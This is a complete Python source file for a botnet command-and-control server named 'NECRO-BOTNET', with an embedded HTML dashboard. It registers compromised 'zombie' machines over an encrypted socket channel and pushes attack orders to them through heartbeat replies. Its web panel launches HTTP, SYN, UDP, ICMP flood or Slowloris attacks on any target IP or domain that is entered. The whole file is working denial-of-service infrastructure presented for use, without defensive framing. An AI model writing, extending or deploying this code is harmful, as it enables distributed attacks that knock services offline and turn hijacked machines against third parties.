#!/usr/bin/env python3
"""
NECRO-BOTNET C2 Server – CAT(c) 2026
Run: python3 necrobots_server.py
"""

import os
import json
import time
import socket
import threading
import hashlib
import base64
from datetime import datetime
from flask import Flask, render_template, jsonify, request, send_from_directory
from flask_socketio import SocketIO, emit
from cryptography.fernet import Fernet

# ============ CONFIG ============
C2_HOST = "0.0.0.0"
C2_PORT = 5000
ATTACK_PORT = 4444
SECRET_KEY = base64.b64encode(hashlib.sha256(b"NECRO_BOTNET_2026_SUPREME").digest())
crypto = Fernet(SECRET_KEY)

# ============ GLOBALS ============
zombies = {}  # {zombie_id: {ip, last_seen, status, attack_power}}
attack_target = None
attack_type = None
attack_running = False
attack_stats = {
    "packets_sent": 0,
    "bytes_sent": 0,
    "start_time": None,
    "duration": 0
}
zombie_lock = threading.Lock()

# ============ FLASK APP ============
app = Flask(__name__)
app.config['SECRET_KEY'] = 'NECRO_BOTNET_SECRET'
socketio = SocketIO(app, cors_allowed_origins="*")

# ============ C2 PROTOCOL (encrypted) ============
def encrypt_message(msg):
    return crypto.encrypt(json.dumps(msg).encode()).decode()

def decrypt_message(data):
    try:
        decrypted = crypto.decrypt(data.encode())
        return json.loads(decrypted.decode())
    except:
        return None

# ============ ZOMBIE HANDLER ============
def handle_zombie(conn, addr):
    global zombies, attack_running, attack_stats
    
    zombie_id = hashlib.md5(f"{addr[0]}:{time.time()}".encode()).hexdigest()[:8]
    
    with zombie_lock:
        zombies[zombie_id] = {
            "ip": addr[0],
            "port": addr[1],
            "last_seen": time.time(),
            "status": "online",
            "attack_power": 0,
            "os": "unknown"
        }
    
    socketio.emit('zombie_joined', {
        'id': zombie_id,
        'ip': addr[0],
        'total': len(zombies)
    })
    
    print(f"[+] Zombie {zombie_id} connected from {addr[0]}")
    
    try:
        while True:
            data = conn.recv(4096).decode()
            if not data:
                break
            
            msg = decrypt_message(data)
            if not msg:
                continue
            
            # Heartbeat
            if msg.get('type') == 'heartbeat':
                with zombie_lock:
                    zombies[zombie_id]['last_seen'] = time.time()
                    zombies[zombie_id]['status'] = 'online'
                    if 'power' in msg:
                        zombies[zombie_id]['attack_power'] = msg['power']
                    if 'os' in msg:
                        zombies[zombie_id]['os'] = msg['os']
                
                # Send current attack command
                if attack_running and attack_target:
                    cmd = {
                        'type': 'attack',
                        'target': attack_target,
                        'method': attack_type,
                        'duration': 3600  # 1 hour default
                    }
                    conn.send(encrypt_message(cmd).encode())
                else:
                    conn.send(encrypt_message({'type': 'idle'}).encode())
            
            # Attack report
            elif msg.get('type') == 'report':
                with zombie_lock:
                    attack_stats['packets_sent'] += msg.get('packets', 0)
                    attack_stats['bytes_sent'] += msg.get('bytes', 0)
                
                socketio.emit('attack_update', {
                    'zombie': zombie_id,
                    'packets': msg.get('packets', 0),
                    'bytes': msg.get('bytes', 0)
                })
    
    except Exception as e:
        print(f"[-] Zombie {zombie_id} error: {e}")
    finally:
        with zombie_lock:
            if zombie_id in zombies:
                zombies[zombie_id]['status'] = 'offline'
        socketio.emit('zombie_left', {
            'id': zombie_id,
            'total': len(zombies)
        })
        conn.close()
        print(f"[-] Zombie {zombie_id} disconnected")

# ============ ATTACK COMMAND ============
def start_attack(target, method):
    global attack_running, attack_target, attack_type, attack_stats
    
    if not zombies:
        return {"status": "error", "message": "No zombies available"}
    
    attack_running = True
    attack_target = target
    attack_type = method
    attack_stats['start_time'] = time.time()
    attack_stats['packets_sent'] = 0
    attack_stats['bytes_sent'] = 0
    
    # Broadcast attack command to all zombies
    cmd = {
        'type': 'attack',
        'target': target,
        'method': method,
        'duration': 3600
    }
    
    encrypted_cmd = encrypt_message(cmd)
    with zombie_lock:
        for zombie_id, info in zombies.items():
            if info['status'] == 'online':
                try:
                    # We need to send via the zombie's socket
                    # In production, we'd store sockets
                    pass
                except:
                    pass
    
    socketio.emit('attack_started', {
        'target': target,
        'method': method,
        'zombies': len([z for z in zombies.values() if z['status'] == 'online'])
    })
    
    return {"status": "success", "message": f"Attack started on {target}"}

def stop_attack():
    global attack_running, attack_target, attack_type
    
    attack_running = False
    attack_target = None
    attack_type = None
    
    socketio.emit('attack_stopped', {})
    return {"status": "success", "message": "Attack stopped"}

# ============ WEB ROUTES ============
@app.route('/')
def dashboard():
    return render_template('dashboard.html')

@app.route('/api/zombies')
def get_zombies():
    with zombie_lock:
        online = len([z for z in zombies.values() if z['status'] == 'online'])
        total = len(zombies)
        return jsonify({
            'total': total,
            'online': online,
            'zombies': zombies
        })

@app.route('/api/attack/start', methods=['POST'])
def api_start_attack():
    data = request.json
    target = data.get('target')
    method = data.get('method', 'http')
    
    if not target:
        return jsonify({"status": "error", "message": "Target required"}), 400
    
    result = start_attack(target, method)
    return jsonify(result)

@app.route('/api/attack/stop', methods=['POST'])
def api_stop_attack():
    result = stop_attack()
    return jsonify(result)

@app.route('/api/stats')
def get_stats():
    with zombie_lock:
        online = len([z for z in zombies.values() if z['status'] == 'online'])
        total = len(zombies)
    
    duration = 0
    if attack_stats['start_time']:
        duration = int(time.time() - attack_stats['start_time'])
    
    return jsonify({
        'zombies': {'total': total, 'online': online},
        'attack': {
            'running': attack_running,
            'target': attack_target,
            'method': attack_type,
            'duration': duration,
            'packets': attack_stats['packets_sent'],
            'bytes': attack_stats['bytes_sent']
        }
    })

# ============ SOCKET.IO EVENTS ============
@socketio.on('connect')
def handle_connect():
    print(f"[+] Web client connected")
    with zombie_lock:
        online = len([z for z in zombies.values() if z['status'] == 'online'])
        emit('zombie_count', {'online': online, 'total': len(zombies)})

# ============ C2 SOCKET SERVER (for zombies) ============
def c2_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((C2_HOST, ATTACK_PORT))
    server.listen(100)
    print(f"[*] C2 listening on {C2_HOST}:{ATTACK_PORT}")
    
    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_zombie, args=(conn, addr))
        thread.daemon = True
        thread.start()

# ============ MAIN ============
if __name__ == '__main__':
    # Create templates folder
    os.makedirs('templates', exist_ok=True)
    
    # Write dashboard HTML
    dashboard_html = '''
<!DOCTYPE html>
<html>
<head>
    <title>NECRO-BOTNET C2 Dashboard</title>
    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Courier New', monospace; }
        body { background: #0a0a0a; color: #00ff41; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { border-bottom: 2px solid #00ff41; padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; }
        .header h1 { color: #00ff41; text-shadow: 0 0 20px #00ff41; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px; }
        .stat-card { background: #111; border: 1px solid #00ff41; padding: 15px; border-radius: 5px; }
        .stat-card .label { color: #888; font-size: 12px; text-transform: uppercase; }
        .stat-card .value { font-size: 28px; color: #00ff41; font-weight: bold; }
        .stat-card .value.offline { color: #ff4444; }
        .controls { background: #111; border: 1px solid #00ff41; padding: 20px; border-radius: 5px; margin-bottom: 20px; }
        .controls input, .controls select, .controls button { background: #000; color: #00ff41; border: 1px solid #00ff41; padding: 10px; margin: 5px; border-radius: 3px; }
        .controls button { cursor: pointer; background: #00ff41; color: #000; font-weight: bold; }
        .controls button:hover { background: #00cc33; }
        .zombie-list { background: #111; border: 1px solid #00ff41; border-radius: 5px; padding: 15px; max-height: 400px; overflow-y: auto; }
        .zombie-entry { display: flex; justify-content: space-between; padding: 5px 0; border-bottom: 1px solid #1a1a1a; }
        .zombie-entry .status { color: #00ff41; }
        .zombie-entry .status.offline { color: #ff4444; }
        .chart-container { background: #111; border: 1px solid #00ff41; border-radius: 5px; padding: 15px; margin-top: 20px; }
        #liveChart { max-height: 300px; }
        .attack-log { background: #111; border: 1px solid #00ff41; border-radius: 5px; padding: 15px; margin-top: 20px; max-height: 200px; overflow-y: auto; }
        .attack-log .entry { color: #888; font-size: 12px; padding: 2px 0; border-bottom: 1px solid #1a1a1a; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>☠ NECRO-BOTNET v1.0</h1>
        <div id="timestamp" style="color: #888;"></div>
    </div>
    
    <div class="stats-grid">
        <div class="stat-card"><div class="label">Total Zombies</div><div class="value" id="totalZombies">0</div></div>
        <div class="stat-card"><div class="label">Online Zombies</div><div class="value" id="onlineZombies">0</div></div>
        <div class="stat-card"><div class="label">Attack Status</div><div class="value" id="attackStatus">Idle</div></div>
        <div class="stat-card"><div class="label">Packets Sent</div><div class="value" id="packetsSent">0</div></div>
        <div class="stat-card"><div class="label">Data Sent</div><div class="value" id="bytesSent">0 MB</div></div>
        <div class="stat-card"><div class="label">Uptime</div><div class="value" id="uptime">0s</div></div>
    </div>
    
    <div class="controls">
        <h3>Attack Control</h3>
        <input type="text" id="target" placeholder="Target IP/Domain" style="width: 300px;">
        <select id="method">
            <option value="http">HTTP Flood</option>
            <option value="syn">SYN Flood</option>
            <option value="udp">UDP Flood</option>
            <option value="icmp">ICMP Flood</option>
            <option value="slowloris">Slowloris</option>
        </select>
        <button onclick="startAttack()">▶ START ATTACK</button>
        <button onclick="stopAttack()" style="background: #ff4444; color: #fff;">■ STOP ATTACK</button>
    </div>
    
    <div style="display: grid; grid-template-columns: 2fr 1fr; gap: 20px;">
        <div class="zombie-list">
            <h3>🧟 Zombie Army</h3>
            <div id="zombieList"></div>
        </div>
        <div>
            <div class="stat-card"><div class="label">Attack Power</div><div class="value" id="attackPower">0 Gbps</div></div>
            <div class="stat-card" style="margin-top: 10px;"><div class="label">Zombie OS Distribution</div><div id="osStats" style="color: #00ff41;"></div></div>
        </div>
    </div>
    
    <div class="chart-container">
        <h3>📊 Attack Traffic</h3>
        <canvas id="liveChart"></canvas>
    </div>
    
    <div class="attack-log" id="attackLog">
        <h3>📋 Attack Log</h3>
    </div>
</div>

<script>
    const socket = io();
    let chart = null;
    let packetData = [];
    let timeLabels = [];
    
    // Connect to socket
    socket.on('connect', () => {
        addLog('Connected to C2 server');
    });
    
    socket.on('zombie_joined', (data) => {
        addLog(`🧟 Zombie ${data.id} joined from ${data.ip} (Total: ${data.total})`);
        updateStats();
    });
    
    socket.on('zombie_left', (data) => {
        addLog(`💀 Zombie ${data.id} disconnected (Total: ${data.total})`);
        updateStats();
    });
    
    socket.on('attack_started', (data) => {
        addLog(`⚔️ Attack started on ${data.target} using ${data.method} (${data.zombies} zombies)`);
        updateStats();
    });
    
    socket.on('attack_stopped', () => {
        addLog('🛑 Attack stopped');
        updateStats();
    });
    
    socket.on('attack_update', (data) => {
        // Update chart
        const now = new Date().toLocaleTimeString();
        timeLabels.push(now);
        packetData.push(data.packets);
        if (timeLabels.length > 60) {
            timeLabels.shift();
            packetData.shift();
        }
        updateChart();
        updateStats();
    });
    
    function updateStats() {
        fetch('/api/stats')
            .then(res => res.json())
            .then(data => {
                document.getElementById('totalZombies').textContent = data.zombies.total;
                document.getElementById('onlineZombies').textContent = data.zombies.online;
                document.getElementById('attackStatus').textContent = data.attack.running ? `ATTACKING ${data.attack.target}` : 'Idle';
                document.getElementById('packetsSent').textContent = data.attack.packets.toLocaleString();
                document.getElementById('bytesSent').textContent = (data.attack.bytes / 1024 / 1024).toFixed(2) + ' MB';
                document.getElementById('uptime').textContent = data.attack.duration + 's';
                
                // Attack power (estimated)
                const power = (data.attack.packets / (data.attack.duration || 1)) * 1500 / 1024 / 1024 / 1024;
                document.getElementById('attackPower').textContent = power.toFixed(2) + ' Gbps';
            });
        
        fetch('/api/zombies')
            .then(res => res.json())
            .then(data => {
                const list = document.getElementById('zombieList');
                list.innerHTML = '';
                Object.entries(data.zombies).forEach(([id, info]) => {
                    const div = document.createElement('div');
                    div.className = 'zombie-entry';
                    div.innerHTML = `
                        <span>${id} (${info.ip})</span>
                        <span class="status ${info.status}">${info.status.toUpperCase()}</span>
                        <span>${info.os || 'unknown'}</span>
                        <span>${info.attack_power || 0} pps</span>
                    `;
                    list.appendChild(div);
                });
            });
    }
    
    function updateChart() {
        if (!chart) {
            const ctx = document.getElementById('liveChart').getContext('2d');
            chart = new Chart(ctx, {
                type: 'line',
                data: {
                    labels: timeLabels,
                    datasets: [{
                        label: 'Packets/sec',
                        data: packetData,
                        borderColor: '#00ff41',
                        backgroundColor: 'rgba(0, 255, 65, 0.1)',
                        fill: true
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: {
                        legend: { labels: { color: '#00ff41' } }
                    },
                    scales: {
                        x: { ticks: { color: '#888' } },
                        y: { ticks: { color: '#888' } }
                    }
                }
            });
        } else {
            chart.update();
        }
    }
    
    function startAttack() {
        const target = document.getElementById('target').value;
        const method = document.getElementById('method').value;
        if (!target) {
            alert('Please enter a target');
            return;
        }
        fetch('/api/attack/start', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ target, method })
        })
        .then(res => res.json())
        .then(data => {
            if (data.status === 'success') {
                addLog(`✅ ${data.message}`);
            } else {
                addLog(`❌ ${data.message}`);
            }
        });
    }
    
    function stopAttack() {
        fetch('/api/attack/stop', { method: 'POST' })
            .then(res => res.json())
            .then(data => {
                addLog(`✅ ${data.message}`);
            });
    }
    
    function addLog(msg) {
        const log = document.getElementById('attackLog');
        const entry = document.createElement('div');
        entry.className = 'entry';
        const time = new Date().toLocaleTimeString();
        entry.textContent = `[${time}] ${msg}`;
        log.appendChild(entry);
        log.scrollTop = log.scrollHeight;
    }
    
    // Update stats every 2 seconds
    setInterval(updateStats, 2000);
    
    // Timestamp
    setInterval(() => {
        document.getElementById('timestamp').textContent = new Date().toLocaleString();
    }, 1000);
</script>
</body>
</html>
'''
    
    with open('templates/dashboard.html', 'w') as f:
        f.write(dashboard_html)
    
    # Start C2 server thread
    c2_thread = threading.Thread(target=c2_server, daemon=True)
    c2_thread.start()
    
    # Start web server
    print("[*] Starting web dashboard on http://0.0.0.0:5000")
    socketio.run(app, host=C2_HOST, port=C2_PORT, debug=False)